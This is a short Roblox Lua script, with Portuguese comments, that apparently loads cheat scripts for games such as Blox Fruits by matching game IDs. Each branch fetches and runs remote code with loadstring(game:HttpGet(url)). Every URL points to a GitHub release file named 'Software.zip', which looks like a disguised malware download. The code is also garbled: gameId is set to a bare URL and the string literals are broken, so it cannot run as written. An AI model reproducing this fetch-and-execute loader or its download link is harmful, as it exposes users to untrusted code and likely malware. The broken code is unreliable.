local function safeLoad(url)
    local success, errorMsg = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    if success then
        print("Script executado com sucesso!")
    else
        warn("Erro ao executar o script: " .. errorMsg)
    end
end

local gameId = https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip

if gameId == 2753915549 or gameId == 4442272183 or gameId == 7449423635 then
    -- Blox Fruits
    print("Detectado Blox Fruits, executando script...")
    safeLoad("https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip%https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip"))()")
elseif gameId == 10260193230 then
    -- Meme Sea
    print("Detectado arm wrestle, executando script...")
    safeLoad("https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip%https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip"))()")
elseif gameId == 13918861725 then
     print("vc adm?")
     safeLoad("https://github.com/celestialhub551/main.lua/releases/download/v1.0/Software.zip")
else
    print("Jogo não reconhecido. Nenhum script foi executado.")
end
